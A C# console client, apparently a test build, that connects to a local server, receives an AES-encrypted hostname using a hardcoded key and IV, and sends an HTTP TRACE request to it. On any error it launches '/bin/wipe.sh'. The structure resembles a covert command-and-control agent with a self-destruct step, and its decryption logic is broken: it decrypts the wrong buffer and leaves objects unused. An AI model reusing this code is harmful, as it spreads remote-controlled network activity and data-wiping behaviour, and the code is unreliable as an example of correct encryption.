using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Security.Cryptography;

namespace ClientTesting
{
	class MainClass
	{
		public static void Main(string[] args)
		{
			// TODO Decide static ip for server
			var ip = "127.0.0.1";
			var port = 59724;
			byte[] bytesReceived = new byte[128];

			IPAddress ipAddress = IPAddress.Parse(ip);

			var ipLocalEndPoint = new IPEndPoint(ipAddress, port);

			var soc = new Socket(ipLocalEndPoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

			try{
				soc.ReceiveTimeout = 500;
				soc.Connect(ipLocalEndPoint);

				int bytes = 1;
				string page = "";
				string plaintext = "";
				var aes = new AesManaged();

				aes.Key = new byte[] {145, 183, 68, 66, 196, 36, 17, 46, 85, 51, 251, 122, 136, 1, 96,
					206, 83, 117, 204, 90, 30, 20, 65, 41, 107, 131, 46, 223, 201, 51, 12, 171};

				aes.IV = new byte[] { 110, 80, 170, 86, 6, 45, 42, 147, 222, 209, 238, 77, 228, 105, 55, 
					88};

				var objRm = new RijndaelManaged();

				objRm.Key = aes.Key;
				objRm.IV = aes.IV;
				objRm.Padding = PaddingMode.Zeros;
				objRm.BlockSize = 128;

				ICryptoTransform dec = aes.CreateDecryptor();
				bytes = soc.Receive(bytesReceived, bytesReceived.Length, 0);
				if(bytes == 0){
					throw new Exception();
				}
				page = page + Encoding.ASCII.GetString(bytesReceived, 0, bytes);

				Console.WriteLine(page);

				if (String.Equals(page, ";)".PadRight(128))){
					Console.WriteLine(";)");
					throw new Exception();
				}

				try{
					var message = "send me the package".PadRight(128);
					soc.Send(Encoding.ASCII.GetBytes(message));
					var ict2 = objRm.CreateDecryptor(objRm.Key, objRm.IV);
					var objMs2 = new MemoryStream(bytesReceived);
					var objCs2 = new CryptoStream(objMs2, ict2, CryptoStreamMode.Read);

					var buffer = new byte[bytesReceived.Length];
					int readBytes = objCs2.Read(buffer, 0, bytesReceived.Length);

					var trimmedData = new byte[readBytes];
					Array.Copy(buffer, trimmedData, readBytes);
					plaintext = Encoding.ASCII.GetString(trimmedData);

					HttpWebRequest con = (HttpWebRequest)WebRequest.Create("http://" + plaintext);

					con.Method = "TRACE";

					con.GetResponse();
				}catch(Exception e){
					Console.WriteLine(plaintext);
				}
				dec.Dispose();

				aes.Dispose();
			}catch(Exception ex){
				var proc = new ProcessStartInfo("/bin/wipe.sh");
				proc.UseShellExecute = true;
				proc.RedirectStandardOutput = false;
				Process.Start(proc);
			}

			soc.Close();
		}
	}
}